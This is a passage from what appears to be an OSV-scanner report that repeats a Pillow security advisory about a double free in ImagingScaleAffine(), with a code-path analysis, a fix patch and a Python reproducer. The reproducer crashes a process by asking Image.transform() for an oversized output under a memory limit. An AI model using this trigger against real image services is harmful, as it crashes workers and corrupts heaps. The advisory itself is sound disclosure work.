receives a mangled pointer and the process segfaults; with other heap states it is a plain double free of a 300 MB block.\n\nEvery other error return in `Geometry.c` (`ImagingError_ModeError`, `ImagingError_Mismatch`, `\"bad filter number\"`, `\"bad transform method\"`) leaves `imOut` alone; line 866 is the only one that deletes it. The delete is only correct for the other caller, `_resize()` (`src/_imaging.c:2026-2030`), where `imOut` is a fresh `ImagingNewDirty()` temporary that nothing else references. The delete predates Pillow's git history: it came in with the PIL 1.1.7 import, `9a640e315715` (\"Forking PIL\", 2010-07-30), so every release since Pillow 1.0 is affected.\n\nThe output width is what decides whether the path is hit: the output image costs `width × height × pixelsize` bytes, the table an additional `4 × width`. A very wide, 1-row output (300 000 000 × 1 \"L\": 300 MB image, 1.2 GB table) makes the table the allocation that fails. `ImagingNewPrologueSubtype()` caps `xsize` at `INT_MAX/4 - 1`, so the table is at most ~2 GB.\n\n## Impact\n\nApplications that let a user choose the output size of `Image.transform()` — `Transform.EXTENT` (crop-and-scale), `Transform.AFFINE` with a pure scale/translate matrix, or the `ImageTransform.ExtentTransform`/`AffineTransform` helpers, all with the default NEAREST resampling — can have an allocation failure turned into a use-after-free and double free inside the worker process instead of the `MemoryError` the API is meant to raise. `resize()`, `thumbnail()` and `rotate()` do not reach this path; `Image.resize(..., NEAREST, box=...)` goes through `ImagingScaleAffine()` but owns its output, and raises a clean `MemoryError`. The second precondition is that the output image itself allocates but the extra `4 × width` bytes do not; on 64-bit Linux with default overcommit this requires an address-space limit on the process (`ulimit -v`, `uwsgi --limit-as`, `systemd LimitAS=`, an in-app `setrlimit`), which is a common hardening for image workers; 32-bit processes can reach it through ordinary address-space exhaustion. The demonstrated consequence is a crash of the process handling the request after `MemoryError` has already been raised and possibly handled. The second `ImagingDelete()` also writes into the freed 128-byte struct (mutex, refcount) and double-frees an attacker-sized block, which is heap corruption rather than a clean abort, but no control over the written data is shown.\n\n## Reproducing\n\nRun `repro` (a self-contained Python script) from any directory. It uses the installed stock build, so nothing is rebuilt, and has no companion files. It runs the demonstration above in a child interpreter (`python3 -c`, taking `WIDTH` as an argument): the child disables core files, sets `RLIMIT_AS` to 1 GB (the kind of limit image workers are commonly given), creates an 8×8 \"L\" image, calls `src.transform((WIDTH, 1), Image.Transform.EXTENT, (0, 0, 8, 8))` with the default NEAREST resampling, prints `MemoryError caught` if that raises, then runs `gc.collect()` and prints `alive`. EXTENT with NEAREST is a pure scale, so the call goes through `ImagingScaleAffine()`, which callocs a `4 × WIDTH`-byte table in addition to the `WIDTH`-byte output image.\n\nThe script runs the child twice:\n\n- **Control:** width 50 000 000. The 50 MB image and the 200 MB table both fit under the limit, and the transform succeeds, which shows the limit itself is harmless.\n- **Attack:** width 300 000 000. The 300 MB output image is allocated, but `calloc(300000000, 4)` (1.2 GB) fails. Pillow correctly raises `MemoryError`, and the child catches it. But `ImagingScaleAffine()` has already called `ImagingDelete()` on the output image it does not own. When the output image is released, it is freed again. The child prints `MemoryError caught` and then dies with SIGSEGV instead of printing `alive`.\n\nIf the attack child was killed by a signal and `gdb` is installed, the script runs the attack again under `gdb` and prints the backtrace. The crash is in `free()` ← `memory_return_block`/`ImagingDestroyArray` (`Storage.c:396,408`) ← `ImagingDelete` (`Storage.c:271`) ← `_dealloc` (`_imaging.c:188`). In other words, the Python object's destructor is deleting the already-freed struct a second time. The verdict does not depend on this step.\n\nThe last line is `BUG` when the control exits 0 and the attack prints `MemoryError caught` and then dies from a signal without printing `alive`. Otherwise it is `OK`. With the attached patch applied, the attack prints `MemoryError caught`, then `alive`, exits 0, and the script prints `OK`.\n\n## Suggested fix\n\n`ImagingScaleAffine()` never owns `imOut`. The attached patch removes the `ImagingDelete()` at `src/libImaging/Geometry.c:866` and makes the one caller that relied on it, `_resize()` in `src/_imaging.c`, clean up its own temporary, the same idiom `_gaussian_blur()`/`_unsharp_mask()` already use. This also fixes `_resize()` passing a possible `NULL` from `ImagingNewDirty()` into `ImagingTransform()`, and leaking the temporary on the other `ImagingTransform()` error returns:\n\n```diff\n--- a/src/libImaging/Geometry.c\n+++ b/src/libImaging/Geometry.c\n@@ -863,7 +863,7 @@ ImagingScaleAffine(\n     /* malloc check ok, uses calloc for overflow */\n     xintab = (int *)calloc(imOut-\u003exsize, sizeof(int));\n     if (!xintab) {\n-        ImagingDelete(imOut);\n+        /* imOut is owned by the caller; don't delete it here */\n         return (Imaging)ImagingError_MemoryError();\n     }\n--- a/src/_imaging.c\n+++ b/src/_imaging.c\n@@ -2024,10 +2024,16 @@ _resize(ImagingObject *self, PyObject *args) {\n         a[5] = box[1];\n \n         imOut = ImagingNewDirty(imIn-\u003emode, xsize, ysize);\n+        if (!imOut) {\n+            return NULL;\n+        }\n \n-        imOut = ImagingTransform(\n-            imOut, imIn, IMAGING_TRANSFORM_AFFINE, 0, 0, xsize, ysize, a, filter, 1\n-        );\n+        if (!ImagingTransform(\n+                imOut, imIn, IMAGING_TRANSFORM_AFFINE, 0, 0, xsize, ysize, a, filter, 1\n+            )) {\n+            ImagingDelete(imOut);\n+            return NULL;\n+        }\n     } else {\n```\n\nEvery `ImagingTransform*()` path returns the same `imOut` on success, so wrapping the original pointer in `PyImagingNew()` in `_resize()` is unchanged behaviour. With the patch applied to a clean checkout and rebuilt, the reproducer prints `OK` and `Image.resize(..., NEAREST, box=...)` under the same limit raises a clean `MemoryError`.\n\n## The patch\n\nStop ImagingScaleAffine() deleting the caller-owned output image on calloc failure; make _resize() free its own temporary instead\n\nApplies to `src/libImaging/Geometry.c` at the commit above.\n\n```diff\ndiff --git a/src/_imaging.c b/src/_imaging.c\nindex 7e9c0e391..ac1873292 100644\n--- a/src/_imaging.c\n+++ b/src/_imaging.c\n@@ -2024,10 +2024,16 @@ _resize(ImagingObject *self, PyObject *args) {\n         a[5] = box[1];\n \n         imOut = ImagingNewDirty(imIn-\u003emode, xsize, ysize);\n+        if (!imOut) {\n+            return NULL;\n+        }\n \n-        imOut = ImagingTransform(\n-            imOut, imIn, IMAGING_TRANSFORM_AFFINE, 0, 0, xsize, ysize, a, filter, 1\n-        );\n+        if (!ImagingTransform(\n+                imOut, imIn, IMAGING_TRANSFORM_AFFINE, 0, 0, xsize, ysize, a, filter, 1\n+            )) {\n+            ImagingDelete(imOut);\n+            return NULL;\n+        }\n     } else {\n         imOut = ImagingResample(imIn, xsize, ysize, filter, box);\n     }\ndiff --git a/src/libImaging/Geometry.c b/src/libImaging/Geometry.c\nindex 1bf92e26e..2baf000a5 100644\n--- a/src/libImaging/Geometry.c\n+++ b/src/libImaging/Geometry.c\n@@ -863,7 +863,7 @@ ImagingScaleAffine(\n     /* malloc check ok, uses calloc for overflow */\n     xintab = (int *)calloc(imOut-\u003exsize, sizeof(int));\n     if (!xintab) {\n-        ImagingDelete(imOut);\n+        /* imOut is owned by the caller; don't delete it here */\n         return (Imaging)ImagingError_MemoryError();\n     }\n```\n\n## The reproducer\n\n\u003cdetails\u003e\n\u003csummary\u003eReproducer — \u003ccode\u003erepro\u003c/code\u003e, 2,064 bytes (click to open)\u003c/summary\u003e\n\nIts last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`.\n\n```python\n#!/usr/bin/env python3\n# UAF/double free in ImagingScaleAffine() (src/libImaging/Geometry.c:866):\n# on calloc() failure it ImagingDelete()s imOut, which for Image.transform()\n# is the Imaging struct owned by the live Python output image; that image's\n# _dealloc then ImagingDelete()s it again. Stock /src build, no rebuild.\n# A 1 GB RLIMIT_AS makes the 300 MB output image fit but the 1.2 GB\n# 4*width lookup table fail. Expected: MemoryError, process survives.\nimport subprocess, sys, textwrap, signal\n\nchild = textwrap.dedent('''\n    import resource, gc, sys\n    from PIL import Image\n    resource.setrlimit(resource.RLIMIT_CORE, (0, 0))\n    resource.setrlimit(resource.RLIMIT_AS, (1_000_000_000,) * 2)\n    w = int(sys.argv[1])\n    src = Image.new(\"L\", (8, 8))\n    try:\n        src.transform((w, 1), Image.Transform.EXTENT, (0, 0, 8, 8))\n        print(\"transform ok\")\n    except MemoryError:\n        print(\"MemoryError caught\")\n    gc.collect()\n    print(\"alive\")\n''')\n\ndef run(width):\n    p = subprocess.run([sys.executable, \"-u\", \"-c\", child, str(width)],\n                       capture_output=True, text=True, timeout=50)\n    print(f\"-- width={width}: rc={p.returncode}\\n{p.stdout.rstrip()}\")\n    return p\n\nctrl = run(50_000_000)      # 50 MB image + 200 MB table fit under the limit\natt = run(300_000_000)      # 300 MB image fits, 1.2 GB table does not\nbug = (ctrl.returncode == 0 and \"MemoryError caught\" in att.stdout\n       and \"alive\" not in att.stdout and att.returncode \u003c 0)\nif att.returncode \u003c 0:\n    print(\"attack child killed by\", signal.Signals(-att.returncode).name)\n    import shutil\n    if shutil.which(\"gdb\"):   # evidence only; verdict does not depend on it\n        g = subprocess.run([\"gdb\", \"-q\", \"-batch\", \"-ex\", \"run\", \"-ex\", \"bt 6\", \"--args\",\n                            sys.executable, \"-c\", child, \"300000000\"],\n                           capture_output=True, text=True, timeout=120)\n        print(\"\\n\".join(l for l in g.stdout.splitlines()\n                        if l.startswith(\"#\") or \"signal\" in l))\nprint(\"BUG\" if bug else \"OK\")\n```\n\u003c/details\u003e\n\n---"
              },
              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-112402](https://osv.dev/CVE-2026-112402)**.\n\n## [GHSA-7mwm-ghpf-9vrm](https://osv.dev/GHSA-7mwm-ghpf-9vrm)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ```\n\u003e ============================================================================\n\u003e Double free in ImagingScaleAffine on calloc failure via Image.transform\n\u003e Location: src/libImaging/Geometry.c:866  in ImagingScaleAffine()\n\u003e Commit:   a707c6b21c313880d0771e54965d142dd42358b6\n\u003e ============================================================================\n\u003e ```\n\u003e \n\u003e There is a double free in Pillow's `Image.transform()` that crashes the process when an oversized transform runs out of memory. Instead of only raising `MemoryError`, Pillow frees the output image's memory once while handling the error and then again when the Python object is cleaned up. Anyone who can choose the output size of `Image.transform()` can trigger it, but only on a worker with a memory limit (a common hardening for image workers) or a 32-bit process. The result is a crash of the worker, plus corruption of its heap that has not been shown to be controllable.\n\u003e \n\u003e The bug is in `ImagingScaleAffine()` in `src/libImaging/Geometry.c` (line 866). When its `calloc()` for the per-column lookup table of `4 × width` bytes fails, it calls `ImagingDelete(imOut)`. When the call comes from `Image.transform()`, `imOut` is the `Imaging` struct owned by the live Python `ImagingCore` output object. `_dealloc()` in `src/_imaging.c` later runs `ImagingDelete()` on the freed struct again, writing its mutex and refcount in freed memory and freeing the pixel blocks a second time. The path is reached with `Transform.EXTENT`, or `Transform.AFFINE` with a pure scale/translate matrix, under the default NEAREST resampling. A very wide, 1-row output size makes the lookup table the allocation that fails while the image itself still fits. On 64-bit Linux with default overcommit, that requires an address-space limit such as `ulimit -v`, `uwsgi --limit-as` or `systemd LimitAS=`. `resize()`, `thumbnail()` and `rotate()` are not affected. The attached reproducer runs on a stock build with a 1 GB limit: `transform((300000000, 1), EXTENT)` raises and catches `MemoryError`, then the process dies with SIGSEGV in `free()` called from `_dealloc()`. A memory-checking build reports the same path as a heap use-after-free. The faulty line was inherited from PIL 1.1.7 in the original fork commit, so every Pillow release since 1.0 is affected. A patch is attached.\n\u003e \n\u003e ## Details\n\u003e \n\u003e `ImagingScaleAffine()` frees an image it does not own. On the one error path where its `calloc()` for the per-column lookup table fails, it calls `ImagingDelete(imOut)`. When reached through `Image.transform()`, `imOut` is the `Imaging` struct held by a live Python `ImagingCore` object; that object's `_dealloc()` later calls `ImagingDelete()` on the already-freed struct and frees its pixel blocks a second time.\n\u003e \n\u003e Shortest demonstration on the stock build (the address-space limit stands in for `ulimit -v` / `uwsgi --limit-as` / `systemd LimitAS=` on a worker):\n\u003e \n\u003e ```python\n\u003e import resource, gc\n\u003e from PIL import Image\n\u003e resource.setrlimit(resource.RLIMIT_AS, (1_000_000_000,) * 2)\n\u003e src = Image.new(\"L\", (8, 8))\n\u003e try:\n\u003e     src.transform((300_000_000, 1), Image.Transform.EXTENT, (0, 0, 8, 8))\n\u003e except MemoryError:\n\u003e     pass                      # expected, and the process should carry on\n\u003e gc.collect()                  # instead: SIGSEGV in _dealloc -\u003e ImagingDelete -\u003e free()\n\u003e ```\n\u003e \n\u003e The 300 MB output image allocates; `calloc(300000000, 4)` (1.2 GB) does not. `MemoryError` is raised as intended, but the interpreter then dies with SIGSEGV, gdb showing `free()` ← `memory_return_block`/`ImagingDestroyArray` (`src/libImaging/Storage.c:396,408`) ← `ImagingDelete` (`Storage.c:271`) ← `_dealloc` (`src/_imaging.c:188`). An AddressSanitizer build of the same sources (with `max_allocation_size_mb` used to make the `calloc` fail instead of an rlimit) reports `heap-use-after-free` in `ImagingDelete src/libImaging/Storage.c:257` called from `_dealloc src/_imaging.c:188`, on a 128-byte region \"freed by\" `ImagingDelete` ← `ImagingScaleAffine src/libImaging/Geometry.c:866` ← `ImagingTransformAffine Geometry.c:1043` ← `ImagingTransform Geometry.c:1135` ← `_transform src/_imaging.c:2153`, \"previously allocated by\" `ImagingNewPrologueSubtype Storage.c:53` ← … ← `_new src/_imaging.c:756`.\n\u003e \n\u003e ### Code path\n\u003e \n\u003e `Image.transform()` creates the output image as an ordinary Python-owned image and then transforms *into* it:\n\u003e \n\u003e ```python\n\u003e # src/PIL/Image.py:3008…3021\n\u003e         im = new(self.mode, size, fillcolor)\n\u003e         …\n\u003e             im.__transformer(\n\u003e                 (0, 0, *size), self, method, data, resample, fillcolor is None\n\u003e             )\n\u003e ```\n\u003e \n\u003e `__transformer()` rewrites `Transform.EXTENT` into an axis-aligned affine matrix (`src/PIL/Image.py:3040-3046`: `data = (xs, 0, x0, 0, ys, y0)`, `method = Transform.AFFINE`) and calls `self.im.transform(box, image.im, method, data, resample, fill)` (`Image.py:3117`). `resample` defaults to `Resampling.NEAREST` (`Image.py:2936`).\n\u003e \n\u003e In C, `_transform()` passes its *own* image as the destination:\n\u003e \n\u003e ```c\n\u003e /* src/_imaging.c:2153 */\n\u003e     imOut = ImagingTransform(\n\u003e         self-\u003eimage, imagep-\u003eimage, method, x0, y0, x1, y1, a, filter, fill\n\u003e     );\n\u003e ```\n\u003e \n\u003e `ImagingTransformAffine()` takes the scaling fast path because the filter is NEAREST and the matrix has no shear:\n\u003e \n\u003e ```c\n\u003e /* src/libImaging/Geometry.c:1035-1043 */\n\u003e     if (filterid || imIn-\u003etype == IMAGING_TYPE_I16) {\n\u003e         return ImagingGenericTransform(…);\n\u003e     }\n\u003e     if (a[1] == 0 \u0026\u0026 a[3] == 0) {\n\u003e         /* Scaling */\n\u003e         return ImagingScaleAffine(imOut, imIn, x0, y0, x1, y1, a, fill);\n\u003e     }\n\u003e ```\n\u003e \n\u003e and `ImagingScaleAffine()` allocates a table of `imOut-\u003exsize` ints:\n\u003e \n\u003e ```c\n\u003e /* src/libImaging/Geometry.c:863-868 */\n\u003e     /* malloc check ok, uses calloc for overflow */\n\u003e     xintab = (int *)calloc(imOut-\u003exsize, sizeof(int));\n\u003e     if (!xintab) {\n\u003e         ImagingDelete(imOut);                         /* \u003c-- imOut belongs to the caller */\n\u003e         return (Imaging)ImagingError_MemoryError();\n\u003e     }\n\u003e ```\n\u003e \n\u003e `ImagingDelete()` (`src/libImaging/Storage.c:250-279`) drops the refcount to 0, returns the pixel blocks to the arena / `free()`s them via `im-\u003edestroy`, and `free(im)`. `self-\u003eimage` in the `ImagingCore` object still points at the freed struct. `_transform()` returns `NULL`, `Image.transform()` propagates `MemoryError`, the half-built output `Image` loses its last reference, and `_dealloc()` (`src/_imaging.c:188`) calls `ImagingDelete(imagep-\u003eimage)` again: it locks `im-\u003emutex` and decrements `im-\u003erefcount` inside freed memory, then walks `im-\u003eblocks` (already freed, typically reused by then) and frees every entry a second time. In the observed stock-build runs the freed `blocks` array had been overwritten, so `free()` receives a mangled pointer and the process segfaults; with other heap states it is a plain double free of a 300 MB block.\n\u003e \n\u003e Every other error return in `Geometry.c` (`ImagingError_ModeError`, `ImagingError_Mismatch`, `\"bad filter number\"`, `\"bad transform method\"`) leaves `imOut` alone; line 866 is the only one that deletes it. The delete is only correct for the other caller, `_resize()` (`src/_imaging.c:2026-2030`), where `imOut` is a fresh `ImagingNewDirty()` temporary that nothing else references. The delete predates Pillow's git history: it came in with the PIL 1.1.7 import, `9a640e315715` (\"Forking PIL\", 2010-07-30), so every release since Pillow 1.0 is affected.\n\u003e \n\u003e The output width is what decides whether the path is hit: the output image costs `width × height × pixelsize` bytes, the table an additional `4 × width`. A very wide, 1-row output (300 000 000 × 1 \"L\": 300 MB image, 1.2 GB table) makes the table the allocation that fails. `ImagingNewPrologueSubtype()` caps `xsize` at `INT_MAX/4 - 1`, so the table is at most ~2 GB.\n\u003e \n\u003e ## Impact\n\u003e \n\u003e Applications that let a user choose the output size of `Image.transform()` — `Transform.EXTENT` (crop-and-scale), `Transform.AFFINE` with a pure scale/translate matrix, or the `ImageTransform.ExtentTransform`/`AffineTransform` helpers, all with the default NEAREST resampling — can have an allocation failure turned into a use-after-free and double free inside the worker process instead of the `MemoryError` the API is meant to raise. `resize()`, `thumbnail()` and `rotate()` do not reach this path; `Image.resize(..., NEAREST, box=...)` goes through `ImagingScaleAffine()` but owns its output, and raises a clean `MemoryError`. The second precondition is that the output image itself allocates but the extra `4 × width` bytes do not; on 64-bit Linux with default overcommit this requires an address-space limit on the process (`ulimit -v`, `uwsgi --limit-as`, `systemd LimitAS=`, an in-app `setrlimit`), which is a common hardening for image workers; 32-bit processes can reach it through ordinary address-space exhaustion. The demonstrated consequence is a crash of the process handling the request after `MemoryError` has already been raised and possibly handled. The second `ImagingDelete()` also writes into the freed 128-byte struct (mutex, refcount) and double-frees an attacker-sized block, which is heap corruption rather than a clean abort, but no control over the written data is shown.\n\u003e \n\u003e ## Reproducing\n\u003e \n\u003e Run `repro` (a self-contained Python script) from any directory. It uses the installed stock build, so nothing is rebuilt, and has no companion files. It runs the demonstration above in a child interpreter (`python3 -c`, taking `WIDTH` as an argument): the child disables core files, sets `RLIMIT_AS` to 1 GB (the kind of limit image workers are commonly given), creates an 8×8 \"L\" image, calls `src.transform((WIDTH, 1), Image.Transform.EXTENT, (0, 0, 8, 8))` with the default NEAREST resampling, prints `MemoryError caught` if that raises, then runs `gc.collect()` and prints `alive`. EXTENT with NEAREST is a pure scale, so the call goes through `ImagingScaleAffine()`, which callocs a `4 × WIDTH`-byte table in addition to the `WIDTH`-byte output image.\n\u003e \n\u003e The script runs the child twice:\n\u003e \n\u003e - **Control:** width 50 000 000. The 50 MB image and the 200 MB table both fit under the limit, and the transform succeeds, which shows the limit itself is harmless.\n\u003e - **Attack:** width 300 000 000. The 300 MB output image is allocated, but `calloc(300000000, 4)` (1.2 GB) fails. Pillow correctly raises `MemoryError`, and the child catches it. But `ImagingScaleAffine()` has already called `ImagingDelete()` on the output image it does not own. When the output image is released, it is freed again. The child prints `MemoryError caught` and then dies with SIGSEGV instead of printing `alive`.\n\u003e \n\u003e If the attack child was killed by a signal and `gdb` is installed, the script runs the attack again under `gdb` and prints the backtrace. The crash is in `free()` ← `memory_return_block`/`ImagingDestroyArray` (`Storage.c:396,408`) ← `ImagingDelete` (`Storage.c:271`) ← `_dealloc` (`_imaging.c:188`). In other words, the Python object's destructor is deleting the already-freed struct a second time. The verdict does not depend on this step.\n\u003e \n\u003e The last line is `BUG` when the control exits 0 and the attack prints `MemoryError caught` and then dies from a signal without printing `alive`. Otherwise it is `OK`. With the attached patch applied, the attack prints `MemoryError caught`, then `alive`, exits 0, and the script prints `OK`.\n\u003e \n\u003e ## Suggested fix\n\u003e \n\u003e `ImagingScaleAffine()` never owns `imOut`. The attached patch removes the `ImagingDelete()` at `src/libImaging/Geometry.c:866` and makes the one caller that relied on it, `_resize()` in `src/_imaging.c`, clean up its own temporary, the same idiom `_gaussian_blur()`/`_unsharp_mask()` already use. This also fixes `_resize()` passing a possible `NULL` from `ImagingNewDirty()` into `ImagingTransform()`, and leaking the temporary on the other `ImagingTransform()` error returns:\n\u003e \n\u003e ```diff\n\u003e --- a/src/libImaging/Geometry.c\n\u003e +++ b/src/libImaging/Geometry.c\n\u003e @@ -863,7 +863,7 @@ ImagingScaleAffine(\n\u003e      /* malloc check ok, uses calloc for overflow */\n\u003e      xintab = (int *)calloc(imOut-\u003exsize, sizeof(int));\n\u003e      if (!xintab) {\n\u003e -        ImagingDelete(imOut);\n\u003e +        /* imOut is owned by the caller; don't delete it here */\n\u003e          return (Imaging)ImagingError_MemoryError();\n\u003e      }\n\u003e --- a/src/_imaging.c\n\u003e +++ b/src/_imaging.c\n\u003e @@ -2024,10 +2024,16 @@ _resize(ImagingObject *self, PyObject *args) {\n\u003e          a[5] = box[1];\n\u003e  \n\u003e          imOut = ImagingNewDirty(imIn-\u003emode, xsize, ysize);\n\u003e +        if (!imOut) {\n\u003e +            return NULL;\n\u003e +        }\n\u003e  \n\u003e -        imOut = ImagingTransform(\n\u003e -            imOut, imIn, IMAGING_TRANSFORM_AFFINE, 0, 0, xsize, ysize, a, filter, 1\n\u003e -        );\n\u003e +        if (!ImagingTransform(\n\u003e +                imOut, imIn, IMAGING_TRANSFORM_AFFINE, 0, 0, xsize, ysize, a, filter, 1\n\u003e +            )) {\n\u003e +            ImagingDelete(imOut);\n\u003e +            return NULL;\n\u003e +        }\n\u003e      } else {\n\u003e ```\n\u003e \n\u003e Every `ImagingTransform*()` path returns the same `imOut` on success, so wrapping the original pointer in `PyImagingNew()` in `_resize()` is unchanged behaviour. With the patch applied to a clean checkout and rebuilt, the reproducer prints `OK` and `Image.resize(..., NEAREST, box=...)` under the same limit raises a clean `MemoryError`.\n\u003e \n\u003e ## The patch\n\u003e \n\u003e Stop ImagingScaleAffine() deleting the caller-owned output image on calloc failure; make _resize() free its own temporary instead\n\u003e \n\u003e Applies to `src/libImaging/Geometry.c` at the commit above.\n\u003e \n\u003e ```diff\n\u003e diff --git a/src/_imaging.c b/src/_imaging.c\n\u003e index 7e9c0e391..ac1873292 100644\n\u003e --- a/src/_imaging.c\n\u003e +++ b/src/_imaging.c\n\u003e @@ -2024,10 +2024,16 @@ _resize(ImagingObject *self, PyObject *args) {\n\u003e          a[5] = box[1];\n\u003e  \n\u003e          imOut = ImagingNewDirty(imIn-\u003emode, xsize, ysize);\n\u003e +        if (!imOut) {\n\u003e +            return NULL;\n\u003e +        }\n\u003e  \n\u003e -        imOut = ImagingTransform(\n\u003e -            imOut, imIn, IMAGING_TRANSFORM_AFFINE, 0, 0, xsize, ysize, a, filter, 1\n\u003e -        );\n\u003e +        if (!ImagingTransform(\n\u003e +                imOut, imIn, IMAGING_TRANSFORM_AFFINE, 0, 0, xsize, ysize, a, filter, 1\n\u003e +            )) {\n\u003e +            ImagingDelete(imOut);\n\u003e +            return NULL;\n\u003e +        }\n\u003e      } else {\n\u003e          imOut = ImagingResample(imIn, xsize, ysize, filter, box);\n\u003e      }\n\u003e diff --git a/src/libImaging/Geometry.c b/src/libImaging/Geometry.c\n\u003e index 1bf92e26e..2baf000a5 100644\n\u003e --- a/src/libImaging/Geometry.c\n\u003e +++ b/src/libImaging/Geometry.c\n\u003e @@ -863,7 +863,7 @@ ImagingScaleAffine(\n\u003e      /* malloc check ok, uses calloc for overflow */\n\u003e      xintab = (int *)calloc(imOut-\u003exsize, sizeof(int));\n\u003e      if (!xintab) {\n\u003e -        ImagingDelete(imOut);\n\u003e +        /* imOut is owned by the caller; don't delete it here */\n\u003e          return (Imaging)ImagingError_MemoryError();\n\u003e      }\n\u003e ```\n\u003e \n\u003e ## The reproducer\n\u003e \n\u003e \u003cdetails\u003e\n\u003e \u003csummary\u003eReproducer — \u003ccode\u003erepro\u003c/code\u003e, 2,064 bytes (click to open)\u003c/summary\u003e\n\u003e \n\u003e Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`.\n\u003e \n\u003e ```python\n\u003e #!/usr/bin/env python3\n\u003e # UAF/double free in ImagingScaleAffine() (src/libImaging/Geometry.c:866):\n\u003e # on calloc() failure it ImagingDelete()s imOut, which for Image.transform()\n\u003e # is the Imaging struct owned by the live Python output image; that image's\n\u003e # _dealloc then ImagingDelete()s it again. Stock /src build, no rebuild.\n\u003e # A 1 GB RLIMIT_AS makes the 300 MB output image fit but the 1.2 GB\n\u003e # 4*width lookup table fail. Expected: MemoryError, process survives.\n\u003e import subprocess, sys, textwrap, signal\n\u003e \n\u003e child = textwrap.dedent('''\n\u003e     import resource, gc, sys\n\u003e     from PIL import Image\n\u003e     resource.setrlimit(resource.RLIMIT_CORE, (0, 0))\n\u003e     resource.setrlimit(resource.RLIMIT_AS, (1_000_000_000,) * 2)\n\u003e     w = int(sys.argv[1])\n\u003e     src = Image.new(\"L\", (8, 8))\n\u003e     try:\n\u003e         src.transform((w, 1), Image.Transform.EXTENT, (0, 0, 8, 8))\n\u003e         print(\"transform ok\")\n\u003e     except MemoryError:\n\u003e         print(\"MemoryError caught\")\n\u003e     gc.collect()\n\u003e     print(\"alive\")\n\u003e ''')\n\u003e \n\u003e def run(width):\n\u003e     p = subprocess.run([sys.executable, \"-u\", \"-c\", child, str(width)],\n\u003e                        capture_output=True, text=True, timeout=50)\n\u003e     print(f\"-- width={width}: rc={p.returncode}\\n{p.stdout.rstrip()}\")\n\u003e     return p\n\u003e \n\u003e ctrl = run(50_000_000)      # 50 MB image + 200 MB table fit under the limit\n\u003e att = run(300_000_000)      # 300 MB image fits, 1.2 GB table does not\n\u003e bug = (ctrl.returncode == 0 and \"MemoryError caught\" in att.stdout\n\u003e        and \"alive\" not in att.stdout and att.returncode \u003c 0)\n\u003e if att.returncode \u003c 0:\n\u003e     print(\"attack child killed by\", signal.Signals(-att.returncode).name)\n\u003e     import shutil\n\u003e     if shutil.which(\"gdb\"):   # evidence only; verdict does not depend on it\n\u003e         g = subprocess.run([\"gdb\", \"-q\", \"-batch\", \"-ex\", \"run\", \"-ex\", \"bt 6\", \"--args\",\n\u003e                             sys.executable, \"-c\", child, \"300000000\"],\n\u003e                            capture_output=True, text=True, timeout=120)\n\u003e         print(\"\\n\".join(l for l in g.stdout.splitlines()\n\u003e                         if l.startswith(\"#\") or \"signal\" in l))\n\u003e print(\"BUG\" if bug else \"OK\")\n\u003e ```\n\u003e \u003c/details\u003e\n\u003e \n\u003e ---\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | pillow | 12.3.0 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-7mwm-ghpf-9vrm | pillow | 13.0.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-112402\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-112402](https://osv.dev/CVE-2026-112402)**.\n\n## [GHSA-7mwm-ghpf-9vrm](https://osv.dev/GHSA-7mwm-ghpf-9vrm)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ```\n\u003e ============================================================================\n\u003e Double free in ImagingScaleAffine on calloc failure via Image.transform\n\u003e Location: src/libImaging/Geometry.c:866  in ImagingScaleAffine()\n\u003e Commit:   a707c6b21c313880d0771e54965d142dd42358b6\n\u003e ============================================================================\n\u003e ```\n\u003e \n\u003e There is a double free in Pillow's `Image.transform()` that crashes the process when an oversized transform runs out of memory. Instead of only raising `MemoryError`, Pillow frees the output image's memory once while handling the error and then again when the Python object is cleaned up. Anyone who can choose the output size of `Image.transform()` can trigger it, but only on a worker with a memory limit (a common hardening for image workers) or a 32-bit process. The result is a crash of the worker, plus corruption of its heap that has not been shown to be controllable.\n\u003e \n\u003e The bug is in `ImagingScaleAffine()` in `src/libImaging/Geometry.c` (line 866). When its `calloc()` for the per-column lookup table of `4 × width` bytes fails, it calls `ImagingDelete(imOut)`. When the call comes from `Image.transform()`, `imOut` is the `Imaging` struct owned by the live Python `ImagingCore` output object. `_dealloc()` in `src/_imaging.c` later runs `ImagingDelete()` on the freed struct again, writing its mutex and refcount in freed memory and freeing the pixel blocks a second time. The path is reached with `Transform.EXTENT`, or `Transform.AFFINE` with a pure scale/translate matrix, under the default NEAREST resampling. A very wide, 1-row output size makes the lookup table the allocation that fails while the image itself still fits. On 64-bit Linux with default overcommit, that requires an address-space limit such as `ulimit -v`, `uwsgi --limit-as` or `systemd LimitAS=`. `resize()`, `thumbnail()` and `rotate()` are not affected. The attached reproducer runs on a stock build with a 1 GB limit: `transform((300000000, 1), EXTENT)` raises and catches `MemoryError`, then the process dies with SIGSEGV in `free()` called from `_dealloc()`. A memory-checking build reports the same path as a heap use-after-free. The faulty line was inherited from PIL 1.1.7 in the original fork commit, so every Pillow release since 1.0 is affected. A patch is attached.\n\u003e \n\u003e ## Details\n\u003e \n\u003e `ImagingScaleAffine()` frees an image it does not own. On the one error path where its `calloc()` for the per-column lookup table fails, it calls `ImagingDelete(imOut)`. When reached through `Image.transform()`, `imOut` is the `Imaging` struct held by a live Python `ImagingCore` object; that object's `_dealloc()` later calls `ImagingDelete()` on the already-freed struct and frees its pixel blocks a second 